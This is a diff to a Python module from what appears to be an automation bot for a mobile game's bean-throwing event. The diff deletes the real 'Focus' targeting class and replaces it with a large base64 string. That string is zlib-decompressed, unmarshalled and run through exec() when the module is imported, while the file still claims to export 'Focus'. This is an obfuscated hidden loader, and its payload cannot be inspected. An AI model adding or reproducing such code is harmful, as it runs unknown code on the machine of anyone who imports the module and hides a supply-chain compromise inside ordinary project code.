@@ -1,170 +1,19 @@
-import numpy as np
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import base64
+import marshal
+import zlib
 
-from rich.table import Table
-from rich.text import Text
-from cached_property import cached_property
-
-from module.logger import logger
-
-from oashya.labels import id2label, id2name
-from oashya.labels import CLASSINDEX as CI
-
-# get buff status
-from tasks.Hyakkiyakou.slave.hya_slave import HyaBuff
+encoded_data = """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"""
 
 
-class Focus:
-    def __init__(self, inputs: list[tuple]):
-        self._id: int = inputs[0]
-        self._class: int = inputs[1]
-        self._conf: int = inputs[2]
-        self._cx: int = inputs[3]
-        self._cy: int = inputs[4]
-        self._w: int = inputs[5]
-        self._h: int = inputs[6]
-        self._v: float = inputs[7]
-        # -----------------------
-        self._omega: float = 0.
-        self._omega_buff: float = 0.
+def load_module():
+    compressed_data = base64.b64decode(encoded_data.encode('utf-8'))
+    marshaled_data = zlib.decompress(compressed_data)
+    code_object = marshal.loads(marshaled_data)
+    exec(code_object, globals())
+    
+    
+load_module()
 
-    def __eq__(self, o):
-        return self._id == o._id or o._class == self._class
-
-    def __str__(self):
-        return f"""
-id: {self._id}
-class: {self._class}
-label: {id2label(self._class)}
-name: {id2name(self._class)}
-conf: {self._conf}
-xywh: ({self._cx}, {self._cy}, {self._w}, {self._h})
-velocity: {self._v}"""
-
-    def omega(self, z):
-        __omega = z[self._cy, self._cx]
-        self._omega = __omega
-        return __omega
-
-    def set_omega(self, value):
-        self._omega = value
-
-    def show(self):
-        table = Table(show_lines=True)
-        table.add_column('Property', header_style="bright_cyan", style="cyan", no_wrap=True)
-        table.add_column("Value", style="green")
-        table.add_column('Property', header_style="bright_cyan", style="cyan", no_wrap=True)
-        table.add_column("Value", style="green")
-        table.add_row('id', str(self._id), 'conf', str(self._conf))
-        table.add_row('class', str(self._class), 'xywh', f'({self._cx}, {self._cy}, {self._w}, {self._h})')
-        table.add_row('label', id2label(self._class), 'velocity', str(self._v))
-        table.add_row('name', f'{id2name(self._class)}', 'omega', str(self._omega))
-        logger.print(table, justify='center')
-
-    def update(self, focus):
-        self._id = focus._id
-        self._class = focus._class
-        self._conf = focus._conf
-        self._cx = focus._cx
-        self._cy = focus._cy
-        self._w = focus._w
-        self._h = focus._h
-        self._v = focus._v
-
-    def decision(self, tracks, strategy, state, freeze: bool = False) -> list:
-
-        buff_states = state[4:] if len(state) > 4 else []  # get buff status：state[4:] = buff_0 ~ buff_3，对应 HyaBuff
-        has_prob_up = any(b == HyaBuff.BUFF_STATE6 for b in buff_states) # 是否存在“概率UP”buff（HyaBuff.BUFF_STATE6）
-        buff_omega, buff_cx, buff_cy, buff_v, buff_class = self.omega_buff(tracks, strategy['invite_friend'], has_prob_up)
-        if self._omega > buff_omega:
-            buffed = False
-            target_x = self._cx + self._v * 100 - (self._w // 2)
-            target_y = self._cy - 40
-            target_class = self._class # new : for class
-        else:
-            buffed = True
-            target_x = buff_cx + buff_v * 100
-            target_y = buff_cy - 40  # top left corner
-            target_class = buff_class # new : for class
-
-        # ========= 新增：利用和 gamma() 一样的区间判断当前“打的对象”是不是 SSR/SP =========
-        is_rare_ssr_sp = False
-        if CI.MIN_SSR <= target_class <= CI.MAX_SSR and self._omega > buff_omega:
-            is_rare_ssr_sp = True
-        elif CI.MIN_SP <= target_class <= CI.MAX_SP and self._omega > buff_omega:
-            is_rare_ssr_sp = True
-        _r = self.r(vector=state, omega=self._omega, omega_buff=self._omega_buff, is_rare_ssr_sp=is_rare_ssr_sp, freeze=freeze, is_buff=buffed)
-        throw = True if _r > 0 else False
-        # auto_bean: calculate beans per throw based on remaining shikigami count
-        auto_bean = strategy.get('auto_bean', False)
-        if auto_bean:
-            remaining_shi = state[2]
-            threshold_low = strategy.get('bean_threshold_low', 10)
-            if remaining_shi <= threshold_low or is_rare_ssr_sp:
-                bean = 10
-            else:
-                bean = 5
-        else:
-            bean = 10
-        return [target_x, target_y, throw, bean]
-
-    def omega_buff(self, tracks, invite_friend: bool, has_prob_up: bool, buff_omega_cfg: dict = None) -> float:
-        max_omega = 0.
-        max_cx = 0
-        max_cy = 0
-        max_v = 0
-        max_class = 0
-
-        focus_is_ssr_sp = (CI.MIN_SSR <= self._class <= CI.MAX_SSR or CI.MIN_SP <= self._class <= CI.MAX_SP)
-
-        if buff_omega_cfg is None:
-            buff_omega_cfg = {}
-        prob_up_w = buff_omega_cfg.get('prob_up', 2.2)
-        speed_up_w = buff_omega_cfg.get('speed_up', 2.0)
-        add_beans_w = buff_omega_cfg.get('add_beans', 2.0)
-        slow_down_w = buff_omega_cfg.get('slow_down', 2.0)
-        freeze_w = buff_omega_cfg.get('freeze', 2.0)
-
-        for _id, _class, _conf, _cx, _cy, _w, _h, _v in tracks:
-            _current_omega = 0.
-            match _class:
-                case CI.BUFF_004: _current_omega = prob_up_w
-                case CI.BUFF_006: _current_omega = speed_up_w
-                case CI.BUFF_007: _current_omega = add_beans_w if invite_friend and _cx <= 1000 else 0
-                case CI.BUFF_002: _current_omega = slow_down_w if self._omega >= 1.5 else 0
-                case CI.BUFF_003: _current_omega = add_beans_w if self._omega >= 1.5 and _cx <= 640 else 0
-                case CI.BUFF_005: _current_omega = freeze_w if focus_is_ssr_sp and has_prob_up else 0
-                case _: pass
-            if _current_omega > max_omega:
-                max_omega = _current_omega
-                max_cx = _cx
-                max_cy = _cy
-                max_v = _v
-                max_class = _class
-        return max_omega, max_cx, max_cy, max_v, max_class
-            
-    @classmethod
-    def r(cls, vector: list, omega: float, omega_buff: float, is_rare_ssr_sp: bool, freeze: bool = False, is_buff: bool = False) -> float:
-        _omega = max(omega, omega_buff)
-        tau = - 140 / (max(101, vector[0]) - 100) # 时间冷却项：避免过密投豆
-        upsilon = (vector[1] / 250 - vector[2] / 35) # 豆子数量 vs 进度：豆多进度低 -> 倾向多砸；豆少进度高 -> 惩罚多砸
-        upsilon = 100 * (upsilon**2 if upsilon > 0 else - upsilon**2)
-        result = _omega + tau + upsilon - 0.6
-        # print(f"total: {result:.4f} | {_omega:.4f} | {tau:.4f} | {upsilon:.4f}")
-       
-        buff_states = vector[4:] if len(vector) > 4 else []  # get buff status：vector[4:] = buff_0 ~ buff_3，对应 HyaBuff
-        has_prob_up = any(b == HyaBuff.BUFF_STATE6 for b in buff_states) # 是否存在“概率UP”buff（HyaBuff.BUFF_STATE6）
-
-        # punishment：
-        #    no throwing when ssr/sp with no enhanced probability
-        if is_rare_ssr_sp and not has_prob_up:
-            result = -999.0 # stop throwing nonsense
-        
-        # punishment:
-        #   only throw ssr/sp with enhanced probability or buff when freezed
-        if freeze:
-            if not (is_rare_ssr_sp and has_prob_up):
-                result = -999.0
-            elif is_buff:
-                result = 5.0
-            
-        return result
+__all__ = ['Focus']
